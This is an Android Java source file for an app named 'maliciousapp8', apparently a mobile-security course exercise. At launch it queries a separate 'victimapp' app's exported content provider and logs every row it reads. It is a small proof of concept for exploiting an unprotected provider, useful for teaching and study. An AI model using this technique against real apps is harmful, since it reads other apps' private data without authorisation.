package com.example.maliciousapp8;

import androidx.appcompat.app.AppCompatActivity;

import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.UserDictionary;
import android.util.Log;

import java.net.URI;

public class MainActivity extends AppCompatActivity {

    String TAG = "MOBIOTSEC";

    static final String PROVIDER_NAME = "com.example.victimapp.MyProvider";
    static final String TABLE_NAME = "joke";
    static final String URL = "content://" + PROVIDER_NAME + "/" + TABLE_NAME;
    static final Uri URI = Uri.parse(URL);
    static final int uriCode = 1;

    //public Uri projection = ContentUris.withAppendedId(UserDictionary.Words.CONTENT_URI.1);

    // A "projection" defines the columns that will be returned for each row
    String[] mProjection =
            {
                    UserDictionary.Words._ID,    // Contract class constant for the _ID column name
                    UserDictionary.Words.WORD,   // Contract class constant for the word column name
                    UserDictionary.Words.LOCALE  // Contract class constant for the locale column name
            };

    // Defines a string to contain the selection clause
    String selectionClause = null;

    // Initializes an array to contain selection arguments
    String[] selectionArgs = {""};

    //query()argument 	    SELECT keyword/parameter 	    Notes
    //------------------------------------------------------------------------------------------------------------------------
    //Uri 	                FROM table_name 	            Uri maps to the table in the provider named table_name.
    //projection 	        col,col,col,... 	            projection is an array of columns that should be included for each row retrieved.
    //selection 	        WHERE col = value 	            selection specifies the criteria for selecting rows.
    //selectionArgs 	    (No exact equivalent.
    //                       Selection arguments
    //                       replace ? placeholders
    //                       in the selection clause.)
    //sortOrder 	        ORDER BY col,col,... 	        sortOrder specifies the order in which rows appear in the returned Cursor.


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Queries the user dictionary and returns results
        ContentResolver mContentResolver = getApplicationContext().getContentResolver();
        Cursor cursor = mContentResolver.query(
                URI,   // The content URI of the words table
                null,                        // The columns to return for each row
                null,                   // Selection criteria
                null,                     // Selection criteria
                null);                        // The sort order for the returned rows
        Log.i(TAG,cursor.toString());
        if(cursor != null && cursor.getCount()>0){
            int i = 0;
            while(cursor.moveToNext()){
                Log.i(TAG, cursor.getString(cursor.getColumnIndexOrThrow("id"))+ " " + cursor.getString(cursor.getColumnIndexOrThrow("author")) + " "+ cursor.getString(cursor.getColumnIndexOrThrow("joke")));
                i++;
            }
            cursor.close();
        }else{
            Log.e(TAG, "Error: cursor is < than 1 or null");
            cursor.close();
        }
    }


}